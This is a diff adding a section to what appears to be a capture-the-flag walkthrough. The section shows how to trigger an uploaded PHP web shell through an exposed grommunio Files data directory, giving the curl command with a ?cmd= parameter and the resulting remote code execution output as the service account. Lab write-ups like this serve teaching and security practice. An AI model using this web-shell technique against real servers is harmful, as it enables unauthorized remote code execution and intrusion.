@@ -554,6 +554,53 @@ HTTP 201 (Created) confirms the server accepted and stored `shell.php`.
 <br>
 </div>
 
+### 3.3 Execute the shell and confirm RCE
+
+The upload endpoint only stores the file; it will not run it. This deployment, however, serves Nextcloud's data directory directly over the web, so the shell is reachable and executed as PHP at the data-directory path, which mirrors the on-disk layout `/<user>/files/`.
+
+##### The execution-URL trap (why three URLs behave differently)
+
+The same uploaded file responds three different ways depending on how it is requested, and only one of them runs the code:
+
+- `/files/remote.php/webdav/shell.php` (the WebDAV path): returns the file as a download. WebDAV serves file contents, it does not hand them to the PHP interpreter.
+- The in-browser file previewer: sandboxes and renders the file for viewing; it never executes PHP.
+- `/files/data/<user>/files/shell.php` (the data directory): served by the web server as a normal web path, so PHP here is executed. This is the one that yields code execution.
+
+The data directory on disk is `/var/lib/grommunio-files/data` (confirmed when `config.php` is read during privilege escalation), and the web path mirrors that layout, hence `/files/data/deborah.hernandez/files/`.
+
+**Command:**
+
+```bash
+curl -k 'https://grommunio.autopilot.htb/files/data/deborah.hernandez/files/shell.php?cmd=id'
+```
+
+**Breakdown:**
+
+| Component | Purpose | Simple Explanation |
+| --------- | ------- | ------------------ |
+| `curl -k` | Request the shell | Fetches the URL, ignoring the self-signed certificate. No auth is needed because the data path is served without it. |
+| `/files/data/deborah.hernandez/files/shell.php` | Execution path | The data-directory URL that mirrors where the WebDAV upload landed on disk; requesting it here runs the PHP. |
+| `?cmd=id` | Command input | The value passed to the shell's `$_GET['cmd']`; `id` prints the current user, a safe first command to confirm execution. |
+
+**Result:**
+
+```shell
+uid=462(grofiles) gid=462(grofiles) groups=462(grofiles)
+```
+
+**What this gives you:**
+
+- Confirmed remote code execution on the Linux host via the uploaded web shell.
+- The execution context is the service account `grofiles` (uid 462), which runs grommunio Files' PHP. This is the foothold identity for the Linux privilege-escalation chain that follows.
+<div align="center">
+<br>
+<br>
+※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
 <div align="center">
 <br>
 <br>
